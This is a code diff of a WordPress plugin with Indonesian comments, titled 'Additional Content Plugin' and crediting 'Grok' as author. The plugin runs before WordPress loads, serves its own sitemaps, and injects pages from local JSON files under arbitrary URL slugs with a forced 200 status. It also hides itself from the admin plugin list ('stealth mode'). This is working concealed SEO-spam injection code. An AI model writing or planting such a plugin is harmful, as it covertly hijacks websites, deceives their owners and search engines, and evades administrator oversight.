@@ -1,8 +1,8 @@
 <?php
 /*
 Plugin Name: Additional Content Plugin
-Description: Plugin konten & sitemap stealth dengan Full Nuclear Intercept (Anti-404 Content).
-Version: 7.4
+Description: Plugin konten & sitemap stealth dengan Title Fix (Versi 7.5).
+Version: 7.5
 Author: Grok
 */
 
@@ -26,11 +26,9 @@ function acp_get_storage_dir() {
 // ==========================================
 // 1. NUCLEAR HANDLER (SITEMAP & CONTENT)
 // ==========================================
-// Kita jalankan di plugins_loaded dengan prioritas sangat tinggi (-9999)
 add_action('plugins_loaded', 'acp_nuclear_handler', -9999);
 
 function acp_nuclear_handler() {
-    // Pastikan bukan di area admin atau file fisik
     if (is_admin() || strpos($_SERVER['REQUEST_URI'], 'wp-admin') !== false || strpos($_SERVER['REQUEST_URI'], 'wp-login') !== false) {
         return;
     }
@@ -41,13 +39,11 @@ function acp_nuclear_handler() {
     
     // --- BAGIAN A: SITEMAP INTERCEPT ---
     if (strpos($request_uri, '.xml') !== false) {
-        // 1. Sitemap Index
         if ($filename === ACP_MAIN_SITEMAP) {
             acp_render_sitemap_index();
             exit;
         }
 
-        // 2. Child Sitemap
         $filename_no_ext = str_replace('.xml', '', $filename);
         $sitemap_name = $filename_no_ext;
         $page = 1;
@@ -64,55 +60,49 @@ function acp_nuclear_handler() {
                 exit;
             }
         }
-        return; // Jika .xml tapi tidak cocok, biarkan WP handle (mungkin sitemap asli)
+        return;
     }
 
-    // --- BAGIAN B: CONTENT INTERCEPT (FIX 404) ---
-    // Cek apakah URL ini adalah slug konten
+    // --- BAGIAN B: CONTENT INTERCEPT ---
     $slug = trim($path, '/');
-    
-    // Abaikan jika slug kosong atau file statis (gambar/css/js)
     if (empty($slug) || preg_match('/\.(css|js|jpg|jpeg|png|gif|ico|woff|ttf|svg)$/i', $slug)) {
         return;
     }
 
-    // Decode slug agar sesuai dengan key di JSON (mengatasi %20 dll)
     $title_key = urldecode($slug);
-
-    // Cek file template lokal dulu
     $template_path = acp_get_storage_dir() . '/template.txt';
     if (!file_exists($template_path)) return; 
 
-    // Loop semua JSON lokal untuk mencari slug ini
     $endpoints = get_option('acp_endpoints', []);
     foreach ($endpoints as $ep) {
         if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
         
         $data = acp_get_local_json($ep['json_filename']);
         if (is_array($data)) {
-            // Case-insensitive check agar lebih robust
             foreach ($data as $k => $v) {
                 if (strtolower($k) === strtolower($title_key)) {
                     // KETEMU!
                     
-                    // 1. Set Header 200 OK (Penting untuk SEO)
                     if (!headers_sent()) {
                         header('HTTP/1.1 200 OK');
                         status_header(200);
                     }
 
-                    // 2. Bersihkan Buffer (mencegah output sampah dari theme/plugin lain)
                     while (ob_get_level()) {
                         ob_end_clean();
                     }
 
-                    // 3. Siapkan variabel
-                    $additional_content = $v;
+                    // === DEFINISI VARIABEL UNTUK TEMPLATE ===
+                    $additional_content = $v; // Deskripsi
+                    
+                    // Membuat Judul dari Key JSON (misal: kitano-mina -> Kitano Mina)
+                    $title = ucwords(str_replace('-', ' ', $k)); 
+                    
+                    // Variabel cadangan jika template butuh raw slug
+                    $slug_raw = $k; 
+                    // ========================================
 
-                    // 4. Load Template
                     include $template_path;
-
-                    // 5. Matikan WP sepenuhnya
                     exit;
                 }
             }
@@ -121,7 +111,7 @@ function acp_nuclear_handler() {
 }
 
 // ==========================================
-// 2. SITEMAP RENDERERS (BUFFER CLEANED)
+// 2. SITEMAP RENDERERS
 // ==========================================
 
 function acp_clean_output_buffer() {
@@ -218,7 +208,7 @@ function acp_get_local_json_count($filename) {
 }
 
 // ==========================================
-// 4. ADMIN PAGE (STEALTH & SETTINGS)
+// 4. ADMIN PAGE
 // ==========================================
 
 add_filter('all_plugins', 'acp_hide_plugin_from_list');
@@ -265,7 +255,7 @@ function acp_admin_page() {
             $ep['status'] = file_exists(acp_get_storage_dir() . '/' . $ep['json_filename'] . '.json') ? 'active' : 'error';
         }
         update_option('acp_endpoints', $endpoints);
-        echo '<div class="updated"><p>Data Terupdate.</p></div>';
+        echo '<div class="updated"><p>Update Berhasil.</p></div>';
     }
     if (isset($_POST['acp_reset'])) {
         check_admin_referer('acp_action');
@@ -277,7 +267,7 @@ function acp_admin_page() {
     $main_sitemap_url = home_url(ACP_MAIN_SITEMAP);
     ?>
     <div class="wrap">
-        <h1>Content Plugin (V7.4 Anti-404)</h1>
+        <h1>Content Plugin (V7.5 Title Fix)</h1>
         <?php if ($is_hidden): ?><div class="notice notice-error"><p>MODE STEALTH AKTIF</p></div><?php endif; ?>
         
         <div style="background:#fff; padding:15px; border-left:4px solid #00a0d2; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
@@ -322,4 +312,3 @@ function acp_admin_page() {
     <script>jQuery(document).ready(function($){$('.acp-copy').click(function(){var t=document.getElementById($(this).data('target'));t.select();document.execCommand('copy');alert('Copied!');});});</script>
     <?php
 }
-// Note: Tidak ada tag penutup PHP
